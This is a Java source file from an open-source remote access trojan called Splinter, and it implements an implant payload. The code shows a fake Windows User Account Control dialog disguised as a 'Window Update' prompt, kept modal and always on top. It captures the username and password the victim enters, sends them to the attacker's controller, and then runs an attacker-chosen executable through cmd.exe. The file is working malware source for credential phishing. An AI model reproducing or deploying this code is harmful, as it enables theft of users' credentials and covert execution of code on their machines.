/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.Payloads;

import Controller.Drivers.Drivers;
import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.awt.Color;
import java.awt.Dialog.ModalityType;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.text.Document;

public class Frame_SpoofUAC extends JDialog
  implements ActionListener, MouseListener
{
  private static final String strMyClassName = "Frame_SpoofUAC";
  JButton jbtnYes = null;

  JPanel jpnlMain = new JPanel();
  public JTextField jtfUserName;
  public final JTextField jtfPassword = new JTextField();
  public JPasswordField jpw = new JPasswordField();
  public JButton jbtnNo = null;
  private final JLabel jlblProgramName = new JLabel("Default Program");
  private final JLabel jlblUAC_Image = new JLabel("");

  boolean resetUserName = true;
  boolean resetPassword = true;

  String strProgTitle = "Window Update";
  String strExecutablePath = null;
  Splinter_IMPLANT parent = null;
  public static final String jpwText = " Password";

  public Frame_SpoofUAC(String programTitle, String executablePath, Splinter_IMPLANT par)
  {
    try
    {
      setTitle("User Accounts Control");
      this.parent = par;
      setModaling();
      try
      {
        UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
      }
      catch (Exception localException1)
      {
      }

      this.jbtnYes = new JButton("Yes");
      this.jbtnNo = new JButton("No");

      setContentPane(this.jpnlMain);
      this.jpnlMain.setLayout(null);

      if ((programTitle != null) && (!programTitle.trim().equals("")) && (!programTitle.trim().toLowerCase().equals("null")))
      {
        this.strProgTitle = programTitle;
      }

      this.jlblProgramName.setText(this.strProgTitle.trim());

      if ((executablePath == null) || (executablePath.trim().equalsIgnoreCase("null")) || (executablePath.trim().equals("")))
      {
        this.strExecutablePath = null;
      }
      else
      {
        this.strExecutablePath = executablePath;
      }

      try
      {
        setIconImage(new ImageIcon(Frame_SpoofUAC.class.getResource("/Implant/Payloads/UAC.gif")).getImage());
      }
      catch (Exception localException2) {
      }
      setBounds(500, 200, 446, 340);
      setResizable(false);

      this.jpnlMain.add(this.jbtnYes);

      this.jbtnYes.setBounds(283, 281, 73, 25);

      this.jtfUserName = new JTextField();
      this.jtfUserName.setText(" User Name");
      this.jtfUserName.setBounds(100, 184, 197, 23);
      this.jpnlMain.add(this.jtfUserName);
      this.jtfUserName.setColumns(10);
      this.jtfPassword.setText(" Password");
      this.jtfPassword.setColumns(10);
      this.jpw.setColumns(10);
      this.jpw.setBounds(100, 213, 197, 23);
      this.jpw.setOpaque(true);
      this.jpw.setBackground(Color.white);
      this.jtfPassword.setBounds(100, 213, 197, 23);

      this.jpnlMain.add(this.jtfPassword);
      this.jpnlMain.add(this.jpw);
      this.jpw.setVisible(false);
      this.jbtnNo.setBounds(364, 281, 73, 25);

      this.jpnlMain.add(this.jbtnNo);
      this.jlblProgramName.setFont(new Font("Arial", 0, 12));
      this.jlblProgramName.setBounds(199, 72, 226, 14);

      this.jpnlMain.add(this.jlblProgramName);
      this.jlblUAC_Image.setIcon(new ImageIcon(Frame_SpoofUAC.class.getResource("/Implant/Payloads/Windows_UAC.gif")));
      this.jlblUAC_Image.setBounds(0, 0, 441, 311);

      this.jpnlMain.add(this.jlblUAC_Image);
      this.jbtnYes.addActionListener(this);

      this.jtfUserName.addMouseListener(this);
      this.jtfPassword.addMouseListener(this);

      this.jtfUserName.addActionListener(this);
      this.jtfPassword.addActionListener(this);
      this.jpw.addActionListener(this);
      this.jbtnNo.addActionListener(this);
      this.jbtnYes.addActionListener(this);
      try
      {
        this.jtfPassword.getDocument().addDocumentListener(new DocumentListener()
        {
          public void changedUpdate(DocumentEvent e)
          {
          }

          public void insertUpdate(DocumentEvent e)
          {
            try
            {
              String typed = Frame_SpoofUAC.this.jtfPassword.getText().trim().substring(0, Frame_SpoofUAC.this.jtfPassword.getText().trim().toUpperCase().indexOf(" Password".trim().toUpperCase()));
              Frame_SpoofUAC.this.jpw.setText(typed.trim());
            }
            catch (Exception localException)
            {
            }
            Frame_SpoofUAC.this.showJPW();
          }

          public void removeUpdate(DocumentEvent e)
          {
            Frame_SpoofUAC.this.showJPW();
          } } );
      }
      catch (Exception e) {
        Driver.sop("Unable to appropriate UAC");
      }

      this.jbtnYes.revalidate();

      addWindowListener(new WindowAdapter()
      {
        public void windowClosing(WindowEvent e)
        {
          Frame_SpoofUAC.this.parent.sendToController("User closed Spoofed UAC frame via the [X] close button. No credentials harvested.", false, true);
          Frame_SpoofUAC.this.closeFrame();
        }

      });
    }
    catch (Exception e)
    {
      Driver.eop("Constructor", "Frame_SpoofUAC", e, e.getLocalizedMessage(), false);

      dispose();
    }
  }

  public boolean setModaling()
  {
    try
    {
      setModal(true);
      setAlwaysOnTop(true);
      setModalityType(ModalityType.APPLICATION_MODAL);

      return true;
    } catch (Exception ee) {
      Drivers.sop("in " + "Frame_SpoofUAC" + " could not set modaling");
    }
    return false;
  }

  public void closeFrame()
  {
    try
    {
      setVisible(false);
      dispose();
    }
    catch (Exception e)
    {
      Drivers.eop("closeFrame", "Frame_SpoofUAC", e, e.getLocalizedMessage(), false);
      dispose();
    }
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.jbtnNo)
      {
        this.parent.sendToController("User closed Spoofed UAC frame via the No button. No credentials harvested.", false, true);
        closeFrame();
      }
      else if (ae.getSource() == this.jbtnYes)
      {
        harvestUAC_Creds();
      }
      else if (ae.getSource() == this.jtfPassword)
      {
        harvestUAC_Creds();
      }
      else if (ae.getSource() == this.jpw)
      {
        harvestUAC_Creds();
      }
      else if (ae.getSource() == this.jtfUserName)
      {
        harvestUAC_Creds();
      }

    }
    catch (Exception e)
    {
      Driver.eop("ae", "Frame_SpoofUAC", e, e.getLocalizedMessage(), false);
    }
  }

  public boolean harvestUAC_Creds()
  {
    try
    {
      if ((this.jtfUserName.getText() == null) || (this.jtfUserName.getText().trim().equals("")) || (this.jtfUserName.getText().trim().equals("User Name")))
      {
        return false;
      }

      String name = this.jtfUserName.getText().trim();
      String password = this.jtfPassword.getText();

      password = new String(this.jpw.getPassword());

      this.parent.sendToController("UAC HARVESTED USERNAME:" + name + " PW:" + password, false, false);

      if ((this.strExecutablePath != null) && (!this.strExecutablePath.trim().equals("")))
      {
        Process localProcess = Runtime.getRuntime().exec("cmd.exe /C " + this.strExecutablePath.trim(), null, new File("."));
      }

      closeFrame();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("harvestUAC_Creds", "Frame_SpoofUAC", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean showJPW()
  {
    try
    {
      this.jtfPassword.setVisible(false);
      this.jpw.setVisible(true);
      try
      {
        this.jpw.setFocusable(true); this.jpw.requestFocus(); } catch (Exception localException1) {
      }
      this.jpnlMain.validate();
      this.jpnlMain.repaint();
      validate();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("showJPW", "Frame_SpoofUAC", e, "", false);
    }

    return false;
  }

  public void mouseClicked(MouseEvent me)
  {
  }

  public void mouseEntered(MouseEvent arg0)
  {
  }

  public void mouseExited(MouseEvent arg0)
  {
  }

  public void mousePressed(MouseEvent me)
  {
    try
    {
      if ((me.getSource() == this.jtfPassword) && (this.resetPassword))
      {
        this.resetPassword = false;
        this.jtfPassword.setText("");

        showJPW();
      }
      else if ((me.getSource() == this.jtfUserName) && (this.resetUserName))
      {
        this.resetUserName = false;
        this.jtfUserName.setText("");
      }

    }
    catch (Exception e)
    {
      Driver.eop("Mouse Event", "Frame_SpoofUAC", e, e.getLocalizedMessage(), false);
    }
  }

  public void mouseReleased(MouseEvent arg0)
  {
  }
}